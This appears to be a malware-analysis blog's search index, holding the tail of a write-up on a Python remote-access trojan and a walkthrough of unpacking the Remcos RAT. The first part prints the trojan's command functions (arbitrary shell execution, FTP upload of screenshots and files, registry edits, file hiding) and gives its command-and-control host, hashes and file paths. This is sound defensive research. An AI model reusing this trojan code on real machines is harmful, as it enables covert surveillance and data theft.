split_file(arch, args[&#39;-c&#39;]) os.remove(arch) return &quot;Compressed to &quot; + str(chapters + 1) + &quot; chunks in &quot; + os.path.abspath(arch + &#39;0/..&#39;)def split_file(file, size): chunk_size = size * 1024 * 1024 buf = 100 * 1024 * 1024 chapters = 0 ugly_buf = &#39;&#39; with open(file, &#39;rb&#39;) as src: while True: tgt = open(file + &#39;.%1d&#39; % chapters, &#39;wb&#39;) written = 0 while written &amp;lt; chunk_size: if len(ugly_buf) &amp;gt; 0: tgt.write(ugly_buf) tgt.write(src.read(min(buf, chunk_size - written))) written += min(buf, chunk_size - written) ugly_buf = src.read(1) if len(ugly_buf) == 0: break tgt.close() if len(ugly_buf) == 0: break chapters += 1 return chaptersdef chdir(com): ap = ArgumentParser(&quot;cd&quot;) ap.add_argument(&quot;path&quot;, action=&quot;store&quot;, default=&quot;~&quot;, type=str) to = vars(ap.parse_args(com))[&quot;path&quot;] os.chdir(os.path.expanduser(to)) return &quot;Changed directory to {}&quot;.format(os.getcwd())def download(com): args = ftp_arg_parse(com, &quot;download&quot;) filename = args[&quot;f&quot;] ftp = init_ftp(username=args[&quot;u&quot;], password=args[&quot;p&quot;], directory=args[&quot;d&quot;]) ftp.voidcmd(&quot;TYPE I&quot;) resp = &quot;&quot; for p in glob.iglob(filename, recursive=True): if os.path.isdir(p): for folder, subfolder, files in os.walk(p): for file in files: resp = download_file(ftp, resp, file) else: resp = download_file(ftp, resp, p) ftp.quit() return respdef upload_file(com): args = ftp_arg_parse(com, &quot;upload&quot;) filename = args[&quot;f&quot;] file = filename[filename.rfind(&quot;/&quot;) + 1:] with open(file, &quot;wb&quot;) as fp: ftp = init_ftp(username=args[&quot;u&quot;], password=args[&quot;p&quot;], directory=args[&quot;d&quot;]) resp = (ftp.retrbinary(&quot;RETR &quot; + filename, fp.write) + &quot;\\n&quot;) ftp.quit() fp.close() return respdef shot(com): args = ftp_arg_parse(com, &quot;shot&quot;) with mss.mss() as sct: f = sct.shot() with open(f, &quot;rb&quot;) as s_shot: ftp = init_ftp(username=args[&quot;u&quot;], password=args[&quot;p&quot;], directory=args[&quot;d&quot;]) resp = (ftp.storbinary( &quot;STOR &quot; + &quot;shot_{0}_{1}.png&quot;.format(str(platform.node()).replace(&quot; &quot;, &quot;_&quot;), time.time()), s_shot) + &quot;\\n&quot;) s_shot.close() os.remove(f) sct.close() ftp.quit() return respdef get_sys_info(): sysinfo = f&quot;&quot;&quot;Operating System: {platform.system()}Computer Name: {platform.node()}Username: {getuser()}Release Version: {platform.release()}Processor Architecture: {platform.processor()} &quot;&quot;&quot; return sysinfodef task_running(name): res = run_cmd(&quot;tasklist /v /fo csv /fi \\&quot;IMAGENAME eq {}\\&quot;&quot;.format(name)) return res[0].count(name) if res[1] else Falsedef task_kill(name): return run_cmd(&quot;taskkill /f /im \\&quot;{}\\&quot;&quot;.format(name))[1]def run_cmd(cmd, wait=True): if not wait: Popen(cmd, shell=True) return &quot;&quot;, True comm = Popen(cmd, shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE) stdout, stderr = comm.communicate() if not stdout: return fix_coding(stderr), False return fix_coding(stdout), Truedef copy_file_a(cmd): ap = ArgumentParser(&quot;cp&quot;) ap.add_argument(&quot;from&quot;, action=&quot;store&quot;, type=str) ap.add_argument(&quot;to&quot;, action=&quot;store&quot;, type=str) args = vars(ap.parse_args(cmd)) copy_file(args[&quot;from&quot;], args[&quot;to&quot;]) return &quot;{0} has been copied to {1}&quot;.format(args[&quot;from&quot;], args[&quot;to&quot;])def move_file_a(cmd): ap = ArgumentParser(&quot;mv&quot;) ap.add_argument(&quot;what&quot;, action=&quot;store&quot;, type=str) ap.add_argument(&quot;where&quot;, action=&quot;store&quot;, type=str) args = vars(ap.parse_args(cmd)) move_file(args[&quot;what&quot;], args[&quot;where&quot;]) return &quot;{0} has been moved to {1}&quot;.format(args[&quot;from&quot;], args[&quot;to&quot;])def create_link_a(cmd): ap = ArgumentParser(&quot;link&quot;) ap.add_argument(&quot;from&quot;, action=&quot;store&quot;, type=str) ap.add_argument(&quot;where&quot;, action=&quot;store&quot;, type=str, nargs=&quot;?&quot;) ap.add_argument(&quot;-del&quot;, action=&quot;store_true&quot;) args = vars(ap.parse_args(cmd)) if args[&quot;del&quot;]: remove_link(args[&quot;from&quot;]) return &quot;Link to {} has been removed&quot;.format(args[&quot;from&quot;]) else: if not args[&quot;where&quot;]: return ap.print_usage() create_link(args[&quot;from&quot;], args[&quot;where&quot;]) return &quot;Link from {} to {} has been created&quot;.format(args[&quot;from&quot;], args[&quot;where&quot;])def register_a(cmd): ap = ArgumentParser(&quot;register&quot;) ap.add_argument(&quot;-o&quot;, type=str, required=True, help=&quot;The Reg key root&quot;, choices=[&quot;ClsRoot&quot;, &quot;CurUs&quot;, &quot;DynData&quot;, &quot;LocMach&quot;, &quot;PerfData&quot;, &quot;Users&quot;]) ap.add_argument(&quot;-p&quot;, type=str, required=True, help=&quot;Key path under the root&quot;) ap.add_argument(&quot;-n&quot;, type=str, required=True, help=&quot;Name of the new key&quot;) ap.add_argument(&quot;-v&quot;, type=str, required=True, help=&quot;Value of the key&quot;) ap.add_argument(&quot;-t&quot;, type=str, required=True, help=&quot;Value Type&quot;, choices=[&quot;DWord&quot;, &quot;Link&quot;, &quot;Binary&quot;, &quot;QWord&quot;, &quot;SZ&quot;, &quot;None&quot;]) args = vars(ap.parse_args(cmd)) owner = { &quot;ClsRoot&quot;: winreg.HKEY_CLASSES_ROOT, &quot;CurUs&quot;: winreg.HKEY_CURRENT_USER, &quot;DynData&quot;: winreg.HKEY_DYN_DATA, &quot;LocMach&quot;: winreg.HKEY_LOCAL_MACHINE, &quot;PrefData&quot;: winreg.HKEY_PERFORMANCE_DATA, &quot;Users&quot;: winreg.HKEY_USERS } val_type = { &quot;DWord&quot;: winreg.REG_DWORD, &quot;Link&quot;: winreg.REG_LINK, &quot;Binary&quot;: winreg.REG_BINARY, &quot;QWord&quot;: winreg.REG_QWORD, &quot;SZ&quot;: winreg.REG_SZ, &quot;None&quot;: winreg.REG_NONE } registry(owner[args[&quot;o&quot;]], args[&quot;p&quot;], args[&quot;n&quot;], args[&quot;v&quot;], val_type[args[&quot;t&quot;]]) return &quot;{0} Added to {1} registry under the name {2}&quot;.format(args[&quot;f&quot;], owner[args[&quot;o&quot;]] + &quot;|&quot; + args[&quot;p&quot;], args[&quot;n&quot;])def hide_file_a(cmd): ap = ArgumentParser(&quot;hide&quot;) ap.add_argument(&quot;file&quot;, type=str) ap.add_argument(&quot;-del&quot;, action=&quot;store_true&quot;) args = vars(ap.parse_args(cmd)) unhide_file(args[&quot;file&quot;]) if args[&quot;del&quot;] else hide_file(args[&quot;file&quot;]) return &quot;{0} has been {1}&quot;.format(args[&quot;f&quot;], &quot;relieved&quot; if args[&quot;del&quot;] else &quot;hidden&quot;)This script defines the capabilities of the malware, because it’s thelibrary that was used by “smile.py” which is responsible forexecuting built-in commands.Malware capabilities Listing files (ls) Work and change directories (cd) Getting system info Downloading files (Using FTP protocol) Uploading files Taking and uploading screenshot Copying files Moving files Creating shortcuts like (Links) Manipulating registry Hiding files Compressing files Manipulating processes Executing any cmd commandsFurther investigation on the hostThe host found is dellgenius.hopto.orgHopto.org domain is NO-IP service, it’s DDNS service pointsto dynamic IP, such services often used by malwares to make command andcontrol servers more resistant to takedowns and increase sustainabilityon the wild.Looked at shodan.io but no info was found about this hostLooked at securitytrails to check for history of DNS recordsIt looks like year ago it was pointing to hostkey hosting servicewhich apparently was hosting the C&amp;amp;C server. Also, by doing a reverse IPlookup against these IPs it looks like that one of them pointed to thiscryptosuccesstrade.com website, which was a fishy cryptocurrencyinvesting platform. Maybe they were using it as a camouflage. Who knows!https://web.archive.org/web/20200509181348/http://cryptosuccesstrade.com/Indicator of compromisesHashes Sample1, docer.docSHA256208EC23C233580DBFC53AAD5655845F7152ADA56DD6A5C780D54E84A9D227407 smile.zipSHA256FA97AE75665B2C16100EF7529BBD3C08861E4CA27BF27453F6B668AE77D1692E launcher.pySHA2565F1C268826EC0DD0ACA8C89AB63A8A1DE0B4E810DED96CDEE4B28108F3476CE7 frown.pySHA256D4B7E4870795E6F593C9B3143E2BA083CF12AC0C79D2DD64B869278B0247C247 smile.pySHA256252C5D491747A42175C7C57CCC5965E3A7B83EB5F964776EF108539B0A29B2EE smile_funs.pySHA256312F54943EBFD68E927E9AA95A98CA6F2D3572BF99DA6B448C5144864824C04D backer.pySHA256CA8492139C556EAC6710FE73BA31B53302505A8CC57338E4D2146BDFA8F69BDB**\\ affine.pySHA256B1E7DC16E24EBEB60BC6753C54E940C3E7664E9FCB130BD663129ECDB5818FCDFiles C:\\Users\\Public\\smile.zip C:\\Users\\Public\\docer.doc C:\\Users\\Public\\Python37\\launcher.py C:\\Users\\Public\\Python37\\frown.py C:\\Users\\Public\\Python37\\smile.py C:\\Users\\Public\\Python37\\smile_funs.py C:\\Users\\Public\\Python37\\backer.py C:\\Users\\Public\\Python37\\affine.py C:\\Users\\Public\\Python37\\.key C:\\Users\\Public\\Python37\\.readyHosts dellgenius.hopto.org:143" }, { "title": "Remcos Malware Unpacking", "url": "/posts/Remcos-Malware-Unpacking/", "categories": "malware-unpacking", "tags": "malware-unpacking, unpacking", "date": "2021-09-21 05:33:00 +0200", "snippet": "Remcos or Remote Control and Surveillance, marketed as a legitimate software by a Germany-based firm Breaking Security for remotely managing Windows systems is now widely used in multiple malicious campaigns by threat actorsSample infoMalware family: Remcos RATMD5 hash: 5E9770C2B22B03E5726285900AFAB954Initial assessmentAt Malware initial assessment using PE-StudioIt looks like This sample is .NET sample This sample contains the magic byte “MZ” which means it’sexecutable Follows x32 architecture By using DIE to analyze each section entropyWe can conclude that both (.text , .rsrc) are packedAnalysisAt first let’s start analyzing this file using dnspyResourcesThe first interesting things we can observe from this image are“Costura” &amp;amp; “compressed” strings!So, the first question we should ask ourselves. What is Costura? Costura is an addon responsible for Embedding dependencies asresources on extensible tool for weaving .net assemblies calledFody, it is also loads itself with the same technique. After,reaching it’s github project https://github.com/Fody/Costura theyalso clarified that “Embedded assemblies are compressed bydefault” so “compressed” string makes sense now.By opening “Campos.properties.resources” resource we can find As we clarified before they are compressed so there is no reason tocheck them. But as a head up the malware maybe reside in one ofthem. So, we should keep track of decompression/decryption and assemblyloading functions to be able to unpack it. Execution analysis We can see there that it accesses the resource(MainWindow.nabexx + MainWindow.nabexx+ MainWindow.nabexx == “XX”+”XX” + “XX” == “XXXXXX”) It decrypts it using AES algorithm using the resource (XX)as key Then it loads it into the memory By extracting the two resources (XX, XXXXXX) and using thissimple python script, we can check what is loaded into the memory.from Cryptodome.Cipher import AESfk = open(&quot;XX&quot;, &quot;rb&quot;)key = fk.read()bf = open(&quot;XXXXXX&quot;, &quot;rb&quot;)file = bf.read()cipher = AES.new(key, AES.MODE_ECB)new_file = open(&quot;file&quot; , &quot;wb&quot;)new_file.write(cipher.decrypt(file))new_file.close()Continuing the analysisIt looks like it calls function X from Class1 passing theloaded assembly on itThen it invokes the first method on the loaded assembly.by adding awatch on X.getMethods()[0]It looks like that it invoked Function Void X() on X class on the loadedassemblyLet’s go through extracted and loaded file analysisExtracted file AnalysisFile initial assessmentMD5 Hash : 544D12F82787E4453E68906610453093using PE-StudioIt looks like This sample is .NET sample This sample contains the magic byte “MZ”, file type is DLL Follows x32 architecture By using DIE to analyze each section entropyWe can conclude that both .text section is packedAnalysisAt first let’s start analyzing this file using dnspyResourcesAs we have concluded before in the previous sample, it could be usingthe same technique and there is something packed on these resources andit decrypts it then it is loaded into memory.Execution analysisAs we have concluded in the previous section, Function Void X() inclass X was executedIt passes the executed file to the main function resided in LOLclass****For the second time, It it decrypting a resources and loading it them to the memory, But life is too short to trace both unpackingfunctions .so, We are going to replicate this code snippet intoVSCode and extract both files by writing them to disk after decryptionAnalyzing Second fileFile initial assessmentMD5 hash: 06BD2C0097E3CFC03B530BA1391846E3using PE-StudioIt looks like This sample contains the magic byte “MZ”, file type is DLL Follows x32 architecture By using DIE toIt looks like It’s .NET sample This file is not packed AnalysisAt first let’s start analyzing this file using dnspyBy checking the main function there, it looks that this DLL is loadedbefore the actual malware unpacking, to check for active antiviruses anduse it to avoid original malware detectionAnalyzing third fileFile initial assessmentMD5 hash: 5987997662571356AE78251EA3F44C5Eusing PE-StudioIt looks like This sample is C++ sample This sample contains the magic byte “MZ”, and it’s executable Follows x32 architecture By using DIE to analyze each section entropyThen finally this is the unpacked malware" } ]
